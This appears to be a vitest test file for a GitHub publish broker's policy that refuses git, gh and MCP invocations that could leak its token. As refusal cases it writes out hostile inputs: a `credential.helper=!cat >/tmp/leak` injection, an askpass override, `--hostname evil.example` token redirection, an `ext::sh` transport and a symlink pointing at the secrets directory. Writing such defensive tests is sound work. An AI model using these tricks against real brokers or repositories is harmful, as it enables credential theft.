import { readFileSync } from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

import { describe, expect, it } from "vitest";

import {
  admitGhInvocation,
  admitGitPush,
  admitMcpInvocation,
  BROKER_INJECTED_GIT_CONFIG,
  brokerGitConfigForCwd,
  gitConfigAssignments,
  PublishBrokerRefusal,
  resolveBrokerCwd,
  stripGitConfigAssignments,
  WRAPPER_CREDENTIAL_CONFIG_ASSIGNMENTS,
} from "./github-publish-broker-policy.js";

// PEN-4933 / PEN-3183 D1. Every case here is a route from "the broker runs a
// command for me" back to "I hold the token", which is the failure the decision
// document names in §5 and the one thing this boundary cannot survive.

const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../../..");

const expectRefusal = (fn: () => unknown, matching: RegExp) => {
  expect(fn).toThrow(PublishBrokerRefusal);
  expect(fn).toThrow(matching);
};

describe("git admission", () => {
  it("admits a plain push and injects the broker's own config", () => {
    const { argv } = admitGitPush(["push", "origin", "HEAD:topic"]);
    expect(argv.slice(-3)).toEqual(["push", "origin", "HEAD:topic"]);
    for (const assignment of BROKER_INJECTED_GIT_CONFIG) {
      expect(argv).toContain(assignment);
    }
  });

  it("refuses anything that is not a push", () => {
    // `credential fill` is the shortest path from a broker back to a token:
    // it asks the broker's OWN helper for the credential and prints it. It is
    // closed by the verb rather than by a denylist, which is why this case is
    // the first one here.
    expectRefusal(() => admitGitPush(["credential", "fill"]), /performs pushes/);
    expectRefusal(() => admitGitPush(["log", "-1"]), /performs pushes/);
  });

  it("refuses a push reached through an alias rather than resolving one", () => {
    // The broker will not read alias config out of the repository it is being
    // asked to publish: that is attacker-chosen input consulted to decide
    // whether attacker-chosen input is admissible.
    expectRefusal(() => admitGitPush(["yolo"]), /spell it as `git push`/);
  });

  it("refuses a caller-supplied credential helper", () => {
    // `credential.helper` is multi-valued and git hands EVERY configured helper
    // the credential it just used, via `credential approve`. So this one does
    // not need to beat the broker's helper — it only needs to be in the list.
    expectRefusal(
      () => admitGitPush(["-c", "credential.https://github.com.helper=!cat >/tmp/leak", "push"]),
      /sets git config itself/,
    );
    expectRefusal(
      () => admitGitPush(["--config-env=credential.helper=LEAK", "push"]),
      /sets git config itself/,
    );
    expectRefusal(
      () => admitGitPush(["--config-env", "core.askpass=/tmp/evil", "push"]),
      /sets git config itself/,
    );
  });

  it("drops and re-adds the wrapper's own credential flags rather than trusting them", () => {
    const argv = admitGitPush([
      "-c",
      WRAPPER_CREDENTIAL_CONFIG_ASSIGNMENTS[0]!,
      "-c",
      WRAPPER_CREDENTIAL_CONFIG_ASSIGNMENTS[1]!,
      "push",
    ]).argv;
    // The clearing assignment must still precede the helper that follows it,
    // and the pair must come from the broker's constant, not from the caller.
    const clear = argv.lastIndexOf(WRAPPER_CREDENTIAL_CONFIG_ASSIGNMENTS[0]!);
    const helper = argv.lastIndexOf(WRAPPER_CREDENTIAL_CONFIG_ASSIGNMENTS[1]!);
    expect(clear).toBeGreaterThanOrEqual(0);
    expect(helper).toBeGreaterThan(clear);
    expect(argv.filter((t) => t.startsWith("credential.")).length).toBe(2);
  });

  it("pins the transport, which is what closes `git push ext::sh -c ...`", () => {
    // An `ext::` URL asks git to run a LOCAL command as the transport — in
    // this process, that is arbitrary code beside the credential. Enforced by
    // git's own `protocol.allow`, so it cannot disagree with git about which
    // transport a URL selects.
    expect(BROKER_INJECTED_GIT_CONFIG).toContain("protocol.allow=never");
    expect(BROKER_INJECTED_GIT_CONFIG).toContain("protocol.https.allow=always");
  });

  it("scopes safe.directory to the one repository being published", () => {
    expect(brokerGitConfigForCwd("/paperclip/work/repo")).toEqual(["safe.directory=/paperclip/work/repo"]);
    expect(brokerGitConfigForCwd("/x").join()).not.toContain("*");
  });

  it("keeps the wrapper's flag set and the broker's in step", () => {
    // PEN-4541 pins the `git` wrapper's `-c` flags as an exact set. This is now
    // the SECOND place those two assignments appear, so they are read back off
    // the shipped wrapper here: editing one without the other reds this test
    // rather than leaving the broker clearing a helper key the wrapper no
    // longer sets.
    const wrapper = readFileSync(path.join(repoRoot, "docker/github-wrappers/git"), "utf8");
    for (const assignment of WRAPPER_CREDENTIAL_CONFIG_ASSIGNMENTS) {
      expect(wrapper).toContain(assignment);
    }
  });

  it("finds config assignments in all three spellings", () => {
    expect(gitConfigAssignments(["-c", "a=b", "--config-env", "c=D", "--config-env=e=F", "push"])).toEqual([
      { spelling: "-c a=b", assignment: "a=b" },
      { spelling: "--config-env c=D", assignment: "c=D" },
      { spelling: "--config-env=e=F", assignment: "e=F" },
    ]);
    // Stops at the subcommand: a `-c` after it is an argument to the
    // subcommand, not a global option, and reading it as one would let a
    // refusal fire on a legitimate `git push --force -c` style argument.
    expect(gitConfigAssignments(["push", "-c", "a=b"])).toEqual([]);
    expect(stripGitConfigAssignments(["-c", "a=b", "-C", "/dir", "push", "x"])).toEqual(["-C", "/dir", "push", "x"]);
  });
});

describe("gh admission", () => {
  it("refuses the verbs that hand the token or run shell beside it", () => {
    for (const verb of ["auth", "alias", "extension"]) {
      expectRefusal(() => admitGhInvocation([verb, "whatever"]), /refusing `gh /);
    }
    // `gh auth token` is the literal case; naming it keeps the reason legible.
    expectRefusal(() => admitGhInvocation(["auth", "token"]), /auth` prints it/);
  });

  it("admits ordinary work", () => {
    expect(() => admitGhInvocation(["pr", "create", "--body-file", "/tmp/body.md"])).not.toThrow();
    expect(() => admitGhInvocation(["api", "repos/o/r/pulls"])).not.toThrow();
  });

  it("refuses a caller-chosen hostname anywhere in argv", () => {
    // gh sends `Authorization: token <GH_TOKEN>` to whichever host it is
    // pointed at, so this is one flag between the broker and exfiltration.
    expectRefusal(() => admitGhInvocation(["api", "--hostname", "evil.example", "x"]), /names its own hostname/);
    expectRefusal(() => admitGhInvocation(["api", "x", "--hostname=evil.example"]), /names its own hostname/);
  });

  it("applies the same hostname rule to the MCP server", () => {
    expectRefusal(() => admitMcpInvocation(["stdio", "--gh-host=evil.example"]), /names its own host/);
    expect(() => admitMcpInvocation(["stdio"])).not.toThrow();
  });
});

describe("working directory confinement", () => {
  const identity = (p: string) => p;

  it("admits a directory under the workspace root", () => {
    expect(resolveBrokerCwd("/paperclip/work/repo", "/paperclip", identity)).toBe("/paperclip/work/repo");
    expect(resolveBrokerCwd("/paperclip", "/paperclip", identity)).toBe("/paperclip");
  });

  it("refuses the credential directory, which the broker CAN read", () => {
    expectRefusal(
      () => resolveBrokerCwd("/etc/paperclip/secrets/github-token", "/paperclip", identity),
      /outside the shared workspace/,
    );
  });

  it("refuses a sibling that merely shares a prefix", () => {
    expectRefusal(() => resolveBrokerCwd("/paperclip-evil", "/paperclip", identity), /outside the shared workspace/);
  });

  it("judges the RESOLVED path, so a planted symlink cannot walk out", () => {
    const realpath = (p: string) => (p === "/paperclip/work/link" ? "/etc/paperclip/secrets/github-token" : p);
    expectRefusal(
      () => resolveBrokerCwd("/paperclip/work/link", "/paperclip", realpath),
      /outside the shared workspace/,
    );
  });

  it("refuses a relative or unresolvable directory", () => {
    expectRefusal(() => resolveBrokerCwd("work/repo", "/paperclip", identity), /relative working directory/);
    expectRefusal(
      () =>
        resolveBrokerCwd("/paperclip/gone", "/paperclip", () => {
          throw new Error("ENOENT");
        }),
      /does not resolve/,
    );
  });
});
